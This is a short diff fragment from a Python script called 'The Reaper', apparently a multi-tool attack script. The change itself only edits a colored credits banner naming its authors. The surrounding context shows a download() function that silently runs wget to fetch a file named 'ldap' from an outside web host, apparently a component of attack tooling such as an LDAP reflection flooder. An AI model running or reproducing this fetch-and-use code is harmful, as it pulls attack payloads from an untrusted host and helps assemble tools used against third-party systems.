@@ -46,8 +46,8 @@ def thanks():
   print ("\x1b[0;31m*            \x1b[1;37mWelcome To The Reaper\x1b[0;31m          *")
   print ("\x1b[0;31m*********************************************")
   print (" " )
-  print ("\x1b[1;37mThank you for using the reaper! MultiScript Created By\x1b[1;37m")
-  print ("\x1b[1;37m@\x1b[0;31mflexingonlamers  \x1b[1;37m@\x1b[0;31myourv3nom \x1b[1;37m@\x1b[0;31massert.lmao")
+  print ("\x1b[1;37mThank you for using the reaper! ")
+  print ("\x1b[1;37mMultiScript Created By\x1b[1;37m\x1b[1;37m@\x1b[0;31mflexingonlamers ")
   
 def download():
   cri('wget -q http://hentaiwhirled.online/reaper/iphm/ldap -O ldap')
